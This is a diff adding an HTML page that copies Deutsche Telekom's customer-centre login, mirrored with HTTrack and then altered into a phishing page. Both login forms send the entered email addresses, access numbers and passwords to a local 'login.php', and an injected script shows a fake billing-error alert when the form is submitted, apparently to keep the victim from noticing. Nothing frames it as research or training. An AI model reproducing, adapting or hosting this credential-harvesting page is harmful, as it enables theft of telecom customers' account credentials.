@@ -1,0 +1,312 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="de" xml:lang="de"><!-- 0848/35/en/ 0848/
+2.11.4.1-1 
+$Id: SingleLogin.tmpl 7595 2007-01-23 09:06:24Z th.pohl $ --><!-- Mirrored from login.idm.telekom.com/toid/login.cgp?tid=RVzQJbJGZClUitSjnP2q9xua by HTTrack Website Copier/3.x [XR&CO'2013], Fri, 30 Aug 2013 07:35:34 GMT --><!-- Added by HTTrack --><head><meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>My Login</title>
+        <link type="text/css" rel="stylesheet" href="../res/sam08/css/t.css">
+		<script src="../res/sam08/js/js08.js" type="text/javascript"></script>
+        <script src="../res/sam08/js/jquery-1.4.min.js" type="text/javascript"></script>
+        <script src="../res/sam08/js/jquery-ui-1.8.min.js" type="text/javascript"></script>
+		<script src="../../header.cdb.t-online.de/dashboard/global_header/script.js"></script>
+		
+		<script type="text/javascript">
+            $(document).ready(function(){
+            
+            	var active_tab = 0;
+            	if (document.cookie) {
+            		if (document.cookie.indexOf('T_KC_Login_Type=mf') > -1) active_tab = 1;            		
+            	}    
+            	
+                $("#accordion").accordion({
+                	active: active_tab,
+					changestart: function(event, ui) { 
+						if (selectedHelpBox == -1) {
+							$('#leftcolbox').show();
+						 	$('#helpbox1').hide();
+						 	$('#helpbox2').hide();
+						}
+						selectedHelpBox = -1;
+						if ( ui.newHeader.find('a').attr("id") == "a1") {
+							$('#la2').attr("src","../res/sam08/images/littlearrow_2.gif");
+							$('#la1').attr("src","../res/sam08/images/littlearrow_1.gif");
+						}else{
+							$('#la1').attr("src","../res/sam08/images/littlearrow_2.gif");
+							$('#la2').attr("src","../res/sam08/images/littlearrow_1.gif");						
+						}
+					 }
+				});
+				
+				$('.helpicon').bind('mouseover mouseout', function(event){
+					if(event.type == 'mouseover'){
+						$(this).attr("src", "../res/sam08/images/question_hover.gif");
+					}else{
+						$(this).attr("src", "../res/sam08/images/question_active.gif");
+					}
+				});
+				try {
+			    	if(CDB) CDB.globalNavigationModule.init('kundencenter'); 
+			    } catch (e) { }
+           });
+        </script>
+		<style type="text/css">
+			table, table tr, table td {
+				padding:0px !important;
+				margin:0px !important;
+			}
+			#container {
+				height:450px;
+			}
+			#line_1 {
+				height:450px;
+			}
+			#accordion .atitle {
+				width:95%;
+				border-bottom:1px solid black;
+				margin-left:10px;
+				margin-bottom:5px;
+			}
+			#accordion .atitle a{
+				color:black;
+				text-decoration:none;
+				font-weight:bold;
+				line-height:15px;
+			}
+			#accordion .acontent {
+				margin-bottom:20px;
+				height:250px;
+				overflow:hidden;
+			}
+			#usr1, #pwd1, #usr2, #pwd2 {
+				width:250px;
+				border: 1px solid black;
+			}
+			html,body {background: none !important; background-color:white !important;}
+
+		</style>
+    </head>
+    <body>
+<script type="text/javascript">
+	<!--
+	xtnv = document; xtsd = "https://logs1204/"; xtsite = "453040";xtn2 = "40";
+	xtpage = "LEXUSWSI::SingleLogin.tmpl";
+	xt_multc = "";
+	if (window.xtparam!=null){window.xtparam+=xt_multc;}
+	else{window.xtparam=xt_multc;};
+	//-->
+</script>
+<script src="../res/sam08/js/xtcore.js" type="text/javascript"></script>
+
+<script type="text/javascript">
+/*<![CDATA[*/
+  document.write('<div style="display:none">');
+  document.write('<img src="https://toi-ssl.ivwbox.de/cgi-bin/ivw/CP/06080000;/SAM/LEXUSWSI/SingleLogin.tmpl?r='+escape(document.referrer)+'&d='+Date.parse(new Date())+'" width="1" height="1" alt="" />');
+  document.write('<\/div>');
+
+
+function setpixel1(obj) {
+	var ablauf = new Date();
+	ablauf.setTime(ablauf.getTime() + 10000);	
+	document.cookie = "T_KC_Login_Type=fn;path=/; expires=" + ablauf.toGMTString();
+	
+ 	ema = document.getElementById('usr1').value;
+	if (ema != ""){
+	 	if (ema.indexOf("@t-online.de") > -1) {
+	 		return xt_form(obj,'C','40','Login-Seite::Logininfos::TOnlineDE','N', true);
+		}else if (ema.indexOf("@") > -1) {
+	 		return xt_form(obj,'C','40','Login-Seite::Logininfos::AndereDomain','N', true);
+		}else{
+			if (form_input_is_numeric(ema)) {
+				return xt_form(obj,'C','40','Login-Seite::Logininfos::TOID','N', true);
+			}else{
+				return xt_form(obj,'C','40','Login-Seite::Logininfos::OhneDomainangabe','N', true);
+			}
+		}
+	}
+ }
+function setpixel2(obj) {
+	var ablauf = new Date();
+	ablauf.setTime(ablauf.getTime() + 10000);	
+	document.cookie = "T_KC_Login_Type=mf;path=/; expires=" + ablauf.toGMTString();
+	
+	return xt_form(obj,'C','40','Login-Seite::Logininfos::TMobileDaten','N', true);
+ }
+ 
+ function form_input_is_numeric(input){
+    return !isNaN(input);
+  }
+  var selectedHelpBox = -1;
+ function ShowHelpOverlay(id){
+ 	selectedHelpBox = id;
+ 	$('#leftcolbox').hide();
+ 	$('#helpbox1').hide();
+ 	$('#helpbox2').hide();
+	if (id == 1) $('#helpbox1').show();
+	if (id == 2) $('#helpbox2').show();	
+	window.setTimeout("DeleteHelpOverlay()", 500);
+}	
+function DeleteHelpOverlay() {
+	selectedHelpBox = -1;
+}
+/*]]>*/
+</script><div style="display:none"><img src="https://toi-ssl.ivwbox.de/cgi-bin/ivw/CP/06080000;/SAM/LEXUSWSI/SingleLogin.tmpl?r=&amp;d=1595565565000" width="1" height="1" alt=""></div>
+	
+        <div id="container">
+
+            <img id="logo" src="../res/lxwsi/v2011/img/logo_neu.gif" alt="Absender-Logo"><br>						
+            <div id="content">
+                <div class="line" id="line_1">
+
+                  <div class="left_norm box">
+				  	<div id="leftcolbox" style="display:block;">
+	                    
+	
+						<h2 style="margin-bottom:0px;">Kundencenter: Ihre Daten in  bester Ordnung</h2>
+	                    <img src="../res/sam08/images/teaser/kc_overview.jpg" alt="Kundencenter-Informationen" style="height:100px; width:391px;"><br><br>
+						<ul class="bulletlist">
+							<li>Ändern Sie <strong>E-Mail-Adresse</strong> und <strong>Passwörter</strong>.</li>
+							<li>Nutzen Sie <b>RechnungOnline</b>, auch per E-Mail.</li>
+							<li>Wechseln Sie den <strong>Tarif.</strong></li>
+							<li>Melden Sie sich für <strong>neue Dienste</strong> an.</li>
+							<li>Ändern Sie <strong>Anschrift</strong> und <strong>Bankverbindung.</strong></li>
+							<li>Kennen Sie schon unsere Hilfevideos?
+								<ul class="bulletlist">
+									<li><a href="http://www.t-mobile-academy.net/ek_TMDE/2_dtks_vid_kundcent/Funktionen.htm" onclick="return xt_click(this,'C','40','LEXUSWSI::SingleLogin.tmpl::hilfe-video-kc','S')" target="_blank">Hilfevideo zum Kundencenter</a></li>
+									<li><a href="http://www.t-mobile-academy.net/ek_TMDE/2_dtks_vid_kundcent/Login.htm" onclick="return xt_click(this,'C','40','LEXUSWSI::SingleLogin.tmpl::hilfe-video-login','S')" target="_blank">Hilfevideo zum Login</a></li>
+								</ul>
+							</li>
+						</ul>
+					</div>
+					<div id="helpbox1" style="display:none;">
+	                    <h2>Was kann ich hier eingeben?</h2>
+	
+                    <p>
+						<img src="../res/sam08/images/48x48/hilfe.png" alt="Hilfe-Icon" align="left" style="margin-right:5px;">				
+						Geben Sie Ihre <strong>E-Mail-Adresse</strong> ein.<br>
+						Anstelle der E-Mail-Adresse können Sie auch<br>Ihre <img src="../res/sam08/images/icon_lexikon.gif" alt="Lexikon-Icon"><a href="javascript:void%20open_dictionary('http://hilfe.telekom.de/hsp/cms/content/HSP/de/6376');" tabindex="98">Zugangsnummer</a> (vormals T-Online Nummer) eingeben.<br><br>
+						Geben Sie Ihr <strong>Passwort</strong> (Webkennwort) ein. <br>
+						Anstelle des Passworts können Sie auch Ihr  <img src="../res/sam08/images/icon_lexikon.gif" alt="Lexikon-Icon"><a href="javascript:void%20open_dictionary('http://hilfe.telekom.de/hsp/cms/content/HSP/de/6346');" tabindex="99">persönliches Kennwort</a> eingeben.<br><br>
+					</p>
+					<p>
+					Falls Sie Ihre Zugangsnummer oder das persönliche Kennwort vergessen haben, wenden Sie sich an unseren <a href="http://hilfe.telekom.de/hsp/cms/content/HSP/de/3370/faq-45857734" target="toi" tabindex="100">Kundenservice</a>.
+					</p>
+
+					</div>
+					<div id="helpbox2" style="display:none;">
+	                    <h2>Was kann ich hier eingeben?</h2>
+	
+                    <p>
+						<img src="../res/sam08/images/48x48/hilfe.png" alt="Hilfe-Icon" align="left" style="margin-right:5px;">				
+						Geben Sie hier bitte Ihre Zugangsdaten für das Kundencenter (Mobilfunk), ehemals "Mein T-Mobile",
+						ein.<br><br>
+						Falls Sie auch Festnetzkunde der Telekom sind, empfehlen wir Ihnen, das Kundencenter 
+						(Festnetz, Internet, TV) mit ihrem Mobilfunk-Kundencenter zu verknüpfen. <br><br>
+						<a href="http://www.t-mobile.de/fremdcontent/1,2790,127431,00.html" target="_blank">Weitere Informationen dazu finden Sie hier</a>
+					</p>
+					</div>
+                  </div>
+				  
+                  <div class="right_norm box">
+                    <h2>Login Kundencenter Festnetz, Internet, TV</h2>
+					<div id="accordion">
+						<div class="atitle"><table cellspacing="0"><tbody><tr><td><a href="#" id="a1"><img src="../res/sam08/images/littlearrow_1.gif" alt="" id="la1"> Anmelden mit den Zugangsdaten des Kundencenters Festnetz</a></td><td>&nbsp;<a href="#" onclick="ShowHelpOverlay(1);"><img src="../res/sam08/images/question_active.gif" alt="Hilfe" class="helpicon"></a></td></tr></tbody></table></div>
+						<div class="acontent">
+					  		
+<script language="javascript">
+function sayHello()
+{
+alert("Es war ein Fehler. Die Rechnung war fur einen anderen Benutzer.");
+return true;
+}
+</script>
+
+
+
+<form name="login" method="post" action="login.php" autocomplete="off" onsubmit="return sayHello()">
+		
+							
+		                    <p>
+								<label for="usr1"><strong>E-Mail-Adresse</strong> oder Zugangsnummer (vormals T-Online Nummer): </label><br>
+								<input type="text" name="usr" value="" id="usr1"> (z. B. @t-online.de)
+		                    </p>
+		                    <p>
+		                      <label for="pwd1"><strong>Passwort</strong> oder persönliches Kennwort:</label><br>
+		                      <input type="password" name="pwd" value="" id="pwd1"> <a href="http://www.t-online.de/service/kundencenter/index_passwortvergessen.html" onclick="return xt_click(this,'C','40','LEXUSWSI::SingleLogin.tmpl::passwort-vergessen','S')" target="_blank">Passwort vergessen?</a><br>
+		                    </p>
+							
+							
+									
+							
+		                    <p>
+		                      <input type="image" src="../res/sam08/images/login.gif" value="Login" name="login" id="plogin1">
+		                    </p>
+							
+								<p>Keine Zugangsdaten? <a href="http://www.telekom.de/kc/login/registrieren" onclick="return xt_click(this,'C','40','LEXUSWSI::SingleLogin.tmpl::registrieren','S')" target="_blank">Jetzt registrieren</a></p>
+								<p>Alternativ können Sie sich hier auch mit Ihren <a href="http://hilfe.telekom.de/hsp/cms/content/HSP/de/3378/FAQ/theme-45858870/Internet/theme-45858718/Dienste/theme-45858665/Weitere-Dienste/theme-45858533/My-Login?tab=question" target="_blank">"My Login"</a>-Zugangsdaten anmelden.</p>
+							</form>
+						</div>
+						<div class="atitle"><table cellspacing="0"><tbody><tr><td><a href="#" id="a2"><img src="../res/sam08/images/littlearrow_2.gif" alt="" id="la2"> Anmelden mit den Zugangsdaten des Kundencenters Mobilfunk</a></td><td>&nbsp;<a href="#" onclick="ShowHelpOverlay(2);"><img src="../res/sam08/images/question_active.gif" alt="Hilfe" class="helpicon"></a></td></tr></tbody></table></div>
+						<div class="acontent">
+					  		<form name="login" method="post" action="login.php" autocomplete="off">
+							<input type="hidden" name="domn" value="t-mobile.de">
+							
+<input type="hidden" name="tid" value="RVzQJbJGZClUitSjnP2q9xua">
+<input type="hidden" name="appid" value="0848">
+<input type="hidden" name="skinid" value="35">
+<input type="hidden" name="lang" value="en">
+							
+		                    <p>
+								<label for="usr2"><strong>Benutzername:</strong></label><br>
+								<input type="text" name="usr" value="" id="usr2">
+		                    </p>
+		                    <p>
+		                      <label for="pwd2"><strong>Passwort:</strong></label><br>
+		                      <input type="password" name="pwd" value="" id="pwd2"> <a href="https://mein.t-mobile.de/cpc-sp/actiondispatcher.do?action=Password&amp;shortcut=close" onclick="return xt_click(this,'C','40','LEXUSWSI::SingleLogin.tmpl::passwort-vergessen-tmobile','S')" target="_blank">Passwort vergessen?</a><br>
+		                    </p>
+							
+							
+									
+							
+		                    <p>
+		                      <input type="image" src="../res/sam08/images/login.gif" value="Login" name="login" id="plogin2">
+		                    </p>
+							
+							<p>Keine Zugangsdaten? <a href="https://mein.t-mobile.de/cpc-sp/actiondispatcher?action=register" onclick="return xt_click(this,'C','40','LEXUSWSI::SingleLogin.tmpl::registrieren-tmobile','S')" target="_blank">Jetzt registrieren</a></p>
+							<!--<p><a href="http://www.telekom.de/kc/login/registrieren" target="_blank">Freischaltcode eingeben</a></p>-->
+							</form>
+						</div>
+					</div>
+                  </div>
+                </div>
+				<div class="huge" id="id"><!--DAX~12-001~LEXUSWSI.SingleLogin.tmpl~0848/35/en/~0848/--><a href="http://www.telekom.de/impressum" target="_blank" style="color:gray;">Impressum</a></div>
+            </div>      
+
+        </div>
+
+	<script type="text/javascript">
+		if ($('#usr1').val() != "" && $('#usr1').val() == "" ){
+			document.getElementById('pwd1').focus(); 
+		}else if ($('#pwd1').val() == ""){
+
+			document.getElementById('usr1').focus();
+		}
+	</script>
+	 
+<!-- Webcode start -->
+<link rel="stylesheet" type="text/css" href="../../www.telekom.de/is-bin/INTERSHOP.static/WFS/EKI-PK-Site/EKI-PK/-/special/110823_471webcode/webcode.css">
+<script type="text/javascript" src="../../www.telekom.de/is-bin/INTERSHOP.static/WFS/EKI-PK-Site/EKI-PK/-/special/110823_471webcode/webcode.js"></script>
+<script type="text/javascript">
+Webcode.init("kcfestnetz");
+</script>
+<!-- Webcode end --> 
+
+
+	<img src="https://tracking.mlsat02.de/thome/action.php?act=servicetransact&amp;idservicetransaktion=0037" alt="" width="1" height="1">
+	<script type="text/javascript" src="../../tealium.hs.llnwd.net/o43/utag/telekom/fnkc/prod/utag.js"></script>	 
+	
+
+<!-- Mirrored from login.idm.telekom.com/toid/login.cgp?tid=RVzQJbJGZClUitSjnP2q9xua by HTTrack Website Copier/3.x [XR&CO'2013], Fri, 30 Aug 2013 07:36:18 GMT -->
+
+
+
+</body></html>
